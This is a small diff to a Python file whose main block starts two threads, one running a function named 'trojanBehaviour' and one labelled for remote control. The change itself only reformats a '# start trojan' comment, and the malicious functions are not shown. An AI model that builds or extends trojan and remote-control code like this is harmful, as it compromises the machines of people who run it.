@@ -47,7 +47,8 @@ def avvio():
 
 
 if __name__ == "__main__":
-    # start trojan
+    #start trojan
+
     thread_trojan = Thread(target=trojanBehaviour)
     thread_trojan.start()
     thread_remoteControl = Thread(target=avvio)
